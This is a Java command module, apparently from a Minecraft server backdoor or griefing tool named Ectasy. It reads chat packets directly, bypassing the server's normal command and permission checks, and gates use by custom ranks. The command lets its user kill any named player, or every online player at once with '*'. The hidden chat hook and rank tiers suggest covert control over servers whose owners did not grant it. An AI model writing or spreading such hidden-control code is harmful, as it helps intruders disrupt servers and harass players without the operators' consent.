package dev.ectasy.impl.commands.starter;

import com.github.retrooper.packetevents.event.PacketReceiveEvent;
import com.github.retrooper.packetevents.wrapper.play.client.WrapperPlayClientChatMessage;
import dev.ectasy.api.commands.AbstractCommand;
import dev.ectasy.api.commands.CommandInfo;
import dev.ectasy.api.data.Rank;
import dev.ectasy.api.data.User;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

@CommandInfo(
        name = "kill",
        description = "Kills a player.",
        rank = Rank.STARTER,
        async = false
)
public class CommandKill extends AbstractCommand {
    @Override
    public void execute(User user, PacketReceiveEvent event, WrapperPlayClientChatMessage packet, String[] args) {

        if (args.length == 0){
            user.getPlayer().setHealth(0);
            user.sendMessage("You have been killed.");
            return;
        }

        if(args[0].equals("*")){
            for(Player player : Bukkit.getServer().getOnlinePlayers()){
                player.setHealth(0);
            }
            user.sendMessage("All players have been killed.");
            return;
        }

        Player target = Bukkit.getPlayer(args[0]);
        if(target == null){
            user.sendMessage("The player " + user.getMainColor() + args[0] + user.getSecondaryColor() + " is not online.");
            return;
        }

        target.setHealth(0);
        user.sendMessage("The player " + user.getMainColor() + target.getName() + user.getSecondaryColor() + " has been killed.");



    }

}
